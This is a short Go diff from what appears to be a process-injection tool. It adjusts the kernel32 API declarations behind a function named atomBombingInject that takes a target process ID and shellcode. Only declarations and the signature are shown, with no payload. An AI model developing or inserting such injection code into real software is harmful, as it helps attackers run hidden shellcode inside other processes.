@@ -9,9 +9,8 @@ import (
 )
 
 var (
-	procGlobalAddAtomA     = k32.NewProc("GlobalAddAtomA")
-	procGlobalGetAtomNameA = k32.NewProc("GlobalGetAtomNameA")
-	procGlobalDeleteAtom   = k32.NewProc("GlobalDeleteAtom")
+	procGlobalAddAtomA   = k32.NewProc("GlobalAddAtomA")
+	procGlobalDeleteAtom = k32.NewProc("GlobalDeleteAtom")
 )
 
 func atomBombingInject(pid uint32, shellcode []byte) error {
